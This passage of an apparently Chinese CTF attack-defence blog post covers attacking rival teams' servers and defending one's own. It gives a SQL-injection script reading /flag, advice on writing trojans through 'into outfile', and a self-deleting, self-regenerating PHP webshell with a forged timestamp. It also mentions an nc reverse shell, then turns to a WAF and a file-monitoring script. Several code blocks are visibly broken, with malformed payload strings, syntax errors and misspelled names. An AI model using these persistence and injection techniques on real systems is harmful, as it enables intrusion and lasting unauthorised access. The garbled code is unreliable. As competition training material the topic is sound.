class="line">f1.close()</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x5730;&#x5740;&#x3001;shell&#x8DEF;&#x5F84;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x53D1;&#x4E86;&#x4E2A;&#x8BB0;&#x5F55;&#x5728;firstround_flag.txt&#x4E2D;&#xFF0C;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg" alt="flag" title="">                </div>                <div class="image-caption">flag</div>            </figure><p></p><ol start="4"><li>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;<br>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x5305;&#x62EC;SQL&#x6CE8;&#x5165;&#x3001;&#x6587;&#x4EF6;&#x5305;&#x62EC;&#x3001;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7B49;&#x7B49;&#x3002;&#x5BF9;&#x4E8E;SQL&#x6CE8;&#x5165;&#x7C7B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;<code>sqlmap</code>&#x8DD1;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x5229;&#x7528;<code>-sql-shell</code>&#x6267;&#x884C;&#xFF0C;<code>select load_file(&apos;/flag&apos;);</code>&#x5373;&#x53EF;&#x5F97;&#x5230;flag&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>into outfile</code>&#x5199;&#x6728;&#x9A6C;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x5F39;&#x836F;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;&#x7528;<code>sqlmap</code>&#x8DD1;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>payload</code>&#x5199;&#x4E00;&#x4E2A;python&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF1A;<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></span><br><span class="line"><span class="keyword">global</span> sess_admin</span><br><span class="line">date = {<span class="string">&quot;section_name&quot;</span>;<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;admin_name&quot;</span>}:</span><br><span class="line"><span class="string">&quot; &apos;||(SELECT updatexml(1,concat(0x7e,(select load_file(&apos;/flag&apos;)),0x7e),1))||&apos;&quot;</span>,<span class="string">&quot;announcement&quot;</span>;<span class="string">&quot;asd&quot;</span></span><br><span class="line">r = sess_admin.post(<span class="string">&apos;http://%s/index.php/section/add&apos;</span>%host,data=data)</span><br><span class="line">flags = re.findall(<span class="string">r&apos;~(.+?)~&apos;</span>,r.content)</span><br><span class="line"><span class="keyword">if</span> flags:</span><br><span class="line"><span class="keyword">return</span> flags[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;error pwn!&quot;</span></span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x3001;&#x670D;&#x52A1;&#x5668;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;&#xFF1B;</p><h1 id="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"><a href="#&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;" class="headerlink" title="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"></a>&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;</h1><p>&#x8FD9;&#x91CC;&#x8BF4;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x201C;&#x6405;&#x5C4E;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x5230;&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x4EE5;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x4E3B;&#x8981;&#x54DF;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x53CD;&#x5F39;shell</p><ul><li><strong>&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;</strong><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">file_put_contents(<span class="string">&apos;./.config.php&apos;</span>,<span class="string">&apos;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;&apos;</span>);</span><br><span class="line">system(<span class="string">&apos;chmod 777 .config.php&apos;</span>);</span><br><span class="line">touch(<span class="string">&quot;./.config.php&quot;</span>,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">usleep(<span class="number">100</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201C;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x4F1A;&#x4E00;&#x76F4;&#x751F;&#x6210;.config.php&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x81EA;&#x4FEE;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x8981;&#x522B;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x770B;&#x61C2;&#x5C31;&#x884C;&#xFF0C;&#x54C8;&#x54C8;&#x54C8;</p><ul><li><strong>&#x201C;&#x53CD;&#x5F39;shell&#x201D;</strong><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;php&#x6587;&#x4EF6;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;nc&#x53CD;&#x5F39;shell&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4E00;&#x76F4;&#x5F97;&#x5206;&#x4E86;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg" alt="php" title="">                </div>                <div class="image-caption">php</div>            </figure><br>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4E0A;&#x9762;&#x7684;2&#x4E2D;&#x65B9;&#x6CD5;&#xFF0C;&#x9700;&#x8981;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x4E3A;www-data,&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x662F;ctf&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x3002;<p></p><h1 id="&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;"><a href="#&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;" class="headerlink" title="&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;"></a>&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;</h1><p>&#x5BF9;&#x4E8E;&#x9632;&#x5FA1;&#xFF0C;&#x4E00;&#x822C;&#x901A;&#x7528;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF1A;WAF&#x3001;&#x6587;&#x4EF6;&#x76D1;&#x63A7;<br><strong>1. WAF</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p><ol><li>&#x5C06;waf.php&#x4F20;&#x5230;&#x8981;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;</li><li>&#x5728;&#x9875;&#x9762;&#x4E2D;&#x52A0;&#x5165;&#x9632;&#x62A4;&#xFF0C;&#x54DF;&#x4E24;&#x79CD;&#x505A;&#x6CD5;&#xFF0C;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x4E8C;&#x9009;&#x4E00;&#x5373;&#x53EF;&#xFF1A;<br>a).&#x5728;&#x6240;&#x9700;&#x8981;&#x9632;&#x62A4;&#x7684;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4EE3;&#x7801;<br><code>require_once(&apos;waf.php&apos;);</code><br>&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9875;&#x9762;&#x9632;&#x6CE8;&#x5165;&#x3001;&#x8DE8;&#x7AD9;<br>&#x5982;&#x679C;&#x60F3;&#x6574;&#x7AD9;&#x9632;&#x6CE8;&#xFF0C;&#x5C31;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E00;&#x4E2A;&#x516C;&#x7528;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5982;&#x6570;&#x636E;&#x5E93;&#x94FE;&#x63A5;&#x6587;&#x4EF6;config.icn.php&#x4E2D;&#xFF01;<br>&#x6DFB;&#x52A0;<code>require_once(&apos;waf.php&apos;);</code>&#x6765;&#x8C03;&#x7528;&#x4EE3;&#x7801;<br>&#x5E38;&#x7528;php&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;</li></ol><blockquote><p>PHPCMS v9 \phpcms\base.php<br>PHPWIND8.7 \data\sql_config.php<br>DEDECMS 5.7 \data\common.inc.php<br>Discuz X2 \config\config.php_global.php<br>WordPress \wp-config.php<br>Metinfo \include\head.php</p></blockquote><p>b). &#x5728;&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x6700;&#x524D;&#x52A0;&#x4E0A;&#x4EE3;&#x7801;<br>&#x5728;<code>php.ini</code>&#x4E2D;&#x627E;&#x5230;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automaticaly add files before or after any PHP document.</span><br><span class="line">auto_prepend_file = 360_safe3.php&#x8DEF;&#x5F84;&#xFF1B;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x90E8;&#x7F72;waf&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x8C28;&#x614E;&#x90E8;&#x7F72;&#x3002;</p><p><strong>2. &#x6587;&#x4EF6;&#x76D1;&#x63A7;</strong><br>&#x6587;&#x4EF6;&#x76D1;&#x63A7;&#x53EF;&#x4EE5;&#x5BF9;web&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x53D1;&#x73B0;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x88AB;&#x4FEE;&#x6539;&#x7ACB;&#x5373;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x4E0A;&#x4F20;shell&#x7B49;&#x653B;&#x51FB;&#xFF1A;<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = {}<span class="comment">#&#x6587;&#x4EF6;MD5&#x5B57;&#x5178;</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x7279;&#x6B8A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">Special_path_str = <span class="string">&apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;</span></span><br><span class="line">bakstring = <span class="string">&apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;</span></span><br><span class="line">logstring = <span class="string">&apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span></span><br><span class="line">webshellstring = <span class="string">&apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span></span><br><span class="line">difffile = <span class="string">&apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&apos;drops_log&apos;</span><span class="comment">#&#x514D;&#x6B7B;&#x91D1;&#x724C;</span></span><br><span class="line">UNICODE_ENCODEING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x5178;</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))</span><br><span class="line">Special_path = {</span><br><span class="line"><span class="string">&apos;bak&apos;</span> : os.path.realpath(os.path.join(spec_base_path,bakstring)),</span><br><span class="line"><span class="string">&apos;log&apos;</span> : os.path.realpath(os.path.join(spec_base_path,logstring)),</span><br><span class="line"><span class="string">&apos;webshell&apos;</span> : os.path.realpath(os.path.join(spec_base_path,webshellstring)),</span><br><span class="line"><span class="string">&apos;diffile&apos;</span> : os.path.realpath(os.path.join(spec_base_path,diffile)),</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line"><span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;Unicode&#x7F16;&#x7801;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line"><span class="keyword">if</span> noneTuNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line"><span class="keyword">return</span> noneTuNull</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isListLike(value):</span><br><span class="line">value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line"><span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isinstance(value,unicode):</span><br><span class="line"><span class="keyword">return</span> value</span><br><span class="line"><span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">value = value[:ex.start]+<span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CAHR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> unicode(value)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line"><span class="keyword">return</span> unicode(str(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x76EE;&#x5F55;&#x521B;&#x5EFA;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.makedirs(path)</span><br><span class="line"><span class="keyword">except</span> OSRrror <span class="keyword">as</span> exc:</span><br><span class="line"><span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">filelist = []</span><br><span class="line"><span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line"><span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">originalfile = os.path.join(root, filepath)</span><br><span class="line"><span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">filelist.append(originalfile)</span><br><span class="line"><span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BA1;&#x7B97;&#x673A;&#x6587;&#x4EF6;MD5&#x503C;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> open(filepath,<span class="string">&apos;rb&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">md5obj = hashlib.md5()</span><br><span class="line">md5obj.update(f.read())</span><br><span class="line">hash = md5obj.hexdigest()</span><br><span class="line"><span class="keyword">return</span> hash</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[!] getmd5_error : &apos;</span>+getUnicode(filepath)</span><br><span class="line"><span class="keyword">print</span> getUnicode(e)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ORIGIN_FILE_LIST.remove(fielpath)</span><br><span class="line">FILE_MD5_DICT.pop(filepath,<span class="keyword">None</span>)</span><br><span class="line"><span class="keyword">except</span> KeyError, e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">filemd5dict = {}</span><br><span class="line"><span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line"><span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line"><span class="keyword">if</span> md5:</span><br><span class="line">filemd5dict[ori_file] = md5</span><br><span class="line"><span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line"><span class="comment"># if len(os.listdir(Special_path[&apos;bak&apos;])) == 0;</span></span><br><span class="line"><span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line"><span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">shutil.copy2(filepathm Special_path[<span class="string">&apos;bak&apos;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;-------------start---------------&apos;</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">mkdir_p(Special_path[value])</span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;MD5&#xFF0C;&#x540C;&#x4E8B;&#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;</span></span><br><span class="line">ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x91CD;&#x540D;BUG</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[*] pre work end!&apos;</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">file_lsit = getfilelist(CWD)</span><br><span class="line"><span class="comment"># &#x79FB;&#x9664;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;</span></span><br><span class="line">diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line"><span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line"><span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line"><span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = open(filepath, <span class="string">&apos;r&apos;</span>).read()</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[*] websehll find :&apos;</span> + getUnicode(filepath)</span><br><span class="line">shutil.move(filepath,os.path.join(Special_path[<span class="string">&apos;webshell&apos;</span>],ntpath.basename(filepath) + <span 